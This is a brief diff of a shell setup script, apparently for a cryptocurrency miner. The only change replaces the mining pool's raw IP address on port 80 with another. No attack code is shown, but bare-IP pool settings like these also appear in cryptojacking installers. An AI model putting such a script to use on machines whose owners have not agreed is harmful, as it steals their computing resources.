@@ -240,7 +240,7 @@ echo -e "\e[93m          Checking Independent Variables          "
 echo -e "\e[94m                                                  "
 sleep 3
 ALGO="null"
-POOL_URL_AND_PORT="192.110.160.114:80"
+POOL_URL_AND_PORT="95.179.241.203:80"
 IP=$(ip route get 8.8.8.8| grep src| sed 's/.*src \(.*\)$/\1/g')
 CONFIG_NAME="config.json"
 # Install Libraries
